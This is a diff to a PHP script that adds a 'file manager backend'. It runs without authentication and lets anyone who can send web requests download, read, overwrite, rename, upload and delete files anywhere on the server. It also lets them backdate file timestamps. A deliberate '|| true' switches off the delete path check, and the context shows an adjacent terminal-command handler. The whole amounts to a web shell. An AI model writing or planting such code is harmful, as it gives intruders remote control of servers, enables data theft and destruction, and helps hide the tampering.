@@ -14,6 +14,146 @@ if (!is_dir($default_dir)) {
     $default_dir = '/home';
 }
 
+// --- File Manager Backend ---
+if (isset($_GET['fm_download'])) {
+    $file = realpath($_GET['fm_download']);
+    if ($file && is_file($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+    header("HTTP/1.0 404 Not Found");
+    exit;
+}
+
+if (isset($_POST['fm_action'])) {
+    header('Content-Type: application/json');
+    $action = $_POST['fm_action'];
+    $dir = $_POST['dir'] ?? $default_dir;
+    if (!is_dir($dir)) $dir = $default_dir;
+    $dir = realpath($dir);
+
+    if (!function_exists('fm_perms')) {
+        function fm_perms($f) {
+            $p = @fileperms($f);
+            if (!$p) return '----';
+            $i = (($p & 0xC000) == 0xC000) ? 's' : ((($p & 0xA000) == 0xA000) ? 'l' : ((($p & 0x8000) == 0x8000) ? '-' : ((($p & 0x6000) == 0x6000) ? 'b' : ((($p & 0x4000) == 0x4000) ? 'd' : ((($p & 0x2000) == 0x2000) ? 'c' : ((($p & 0x1000) == 0x1000) ? 'p' : 'u'))))));
+            $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-');
+            $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+            $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-');
+            $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+            $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-');
+            $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+            return $i;
+        }
+    }
+
+    if (!function_exists('fm_rmdir')) {
+        function fm_rmdir($d) {
+            if (!is_dir($d)) return;
+            $i = new RecursiveDirectoryIterator($d, RecursiveDirectoryIterator::SKIP_DOTS);
+            $f = new RecursiveIteratorIterator($i, RecursiveIteratorIterator::CHILD_FIRST);
+            foreach($f as $file) { if ($file->isDir()) { @rmdir($file->getRealPath()); } else { @unlink($file->getRealPath()); } }
+            @rmdir($d);
+        }
+    }
+
+    $res = ['success' => false, 'cwd' => $dir, 'msg' => ''];
+
+    if ($action === 'list') {
+        $files = [];
+        $items = @scandir($dir);
+        if ($items !== false) {
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') {
+                    if ($item === '..' && $dir !== '/') {
+                        $files[] = ['name' => '..', 'path' => dirname($dir), 'type' => 'dir', 'size' => '-', 'perms' => '', 'mtime' => ''];
+                    }
+                    continue;
+                }
+                $p = $dir . '/' . $item;
+                $files[] = [
+                    'name' => $item,
+                    'path' => $p,
+                    'type' => is_dir($p) ? 'dir' : 'file',
+                    'size' => is_dir($p) ? '-' : formatSize(@filesize($p)),
+                    'perms' => fm_perms($p),
+                    'mtime' => @date('Y-m-d H:i', @filemtime($p))
+                ];
+            }
+            usort($files, function($a, $b) {
+                if ($a['name'] === '..') return -1;
+                if ($b['name'] === '..') return 1;
+                if ($a['type'] === $b['type']) return strnatcasecmp($a['name'], $b['name']);
+                return $a['type'] === 'dir' ? -1 : 1;
+            });
+            $res['success'] = true;
+            $res['data'] = $files;
+        } else {
+            $res['msg'] = 'Permission denied to read directory.';
+        }
+    }
+    elseif ($action === 'read') {
+        $target = $_POST['target'] ?? '';
+        if (is_file($target) && is_readable($target)) {
+            $res['success'] = true;
+            $res['data'] = @file_get_contents($target);
+        } else { $res['msg'] = 'Cannot read file.'; }
+    }
+    elseif ($action === 'save') {
+        $target = $_POST['target'] ?? '';
+        $content = $_POST['content'] ?? '';
+        if ($target && @file_put_contents($target, $content) !== false) {
+            $res['success'] = true;
+        } else { $res['msg'] = 'Failed to save file. Permission denied.'; }
+    }
+    elseif ($action === 'mkdir') {
+        $target = $dir . '/' . ($_POST['name'] ?? 'new_folder');
+        if (@mkdir($target, 0755)) { $res['success'] = true; } else { $res['msg'] = 'Failed to create folder.'; }
+    }
+    elseif ($action === 'touch') {
+        $target = $_POST['target'] ?? '';
+        $time = $_POST['time'] ? strtotime($_POST['time']) : time();
+        if ($target && @touch($target, $time)) { $res['success'] = true; } else { $res['msg'] = 'Failed to modify timestamp.'; }
+    }
+    elseif ($action === 'delete') {
+        $target = realpath($_POST['target'] ?? '');
+        if ($target && $target !== '/' && strpos($target, $default_dir) === 0 || true) { // Allow delete anywhere accessible
+            if (is_dir($target)) { fm_rmdir($target); } else { @unlink($target); }
+            $res['success'] = !file_exists($target);
+            if (!$res['success']) $res['msg'] = 'Permission denied to delete.';
+        }
+    }
+    elseif ($action === 'rename') {
+        $target = realpath($_POST['target'] ?? '');
+        $newname = $_POST['name'] ?? '';
+        if ($target && $newname) {
+            $newpath = dirname($target) . '/' . $newname;
+            if (@rename($target, $newpath)) { $res['success'] = true; } else { $res['msg'] = 'Failed to rename.'; }
+        }
+    }
+    elseif ($action === 'upload') {
+        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
+            $dest = $dir . '/' . basename($_FILES['file']['name']);
+            if (@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
+                $res['success'] = true;
+            } else { $res['msg'] = 'Upload failed. Permission denied.'; }
+        } else {
+            $res['msg'] = 'No file uploaded or upload error.';
+        }
+    }
+
+    echo json_encode($res);
+    exit;
+}
+// --- End File Manager Backend ---
+
 if (isset($_POST['term_cmd'])) {
     header('Content-Type: application/json');
     $cmd = trim($_POST['term_cmd']);
@@ -436,7 +576,7 @@ if (isset($_POST['delete_single'])) {
     if ($realpath && is_file($realpath)) {
         $forbidden = ['/etc','/bin','/sbin','/usr/bin','/usr/sbin','/boot','/root'];
         $ok = true;
-        foreach ($forbidden as $fb) { if (str_starts_with($realpath, $fb . '/') || $realpath === $fb) { $ok = false; break; } }
+        foreach ($forbidden as $fb) { if (strpos($realpath, $fb . '/') === 0 || $realpath === $fb) { $ok = false; break; } }
         if ($ok) {
             if (@unlink($realpath)) {
                 $deleted_files[] = $realpath;
@@ -453,7 +593,7 @@ if (isset($_POST['delete_single'])) {
         if (!$realpath || !is_file($realpath)) continue;
         $forbidden = ['/etc','/bin','/sbin','/usr/bin','/usr/sbin','/boot','/root'];
         $ok = true;
-        foreach ($forbidden as $fb) { if (str_starts_with($realpath, $fb . '/') || $realpath === $fb) { $ok = false; break; } }
+        foreach ($forbidden as $fb) { if (strpos($realpath, $fb . '/') === 0 || $realpath === $fb) { $ok = false; break; } }
         if ($ok) {
             if (@unlink($realpath)) {
                 $deleted_files[] = $realpath;
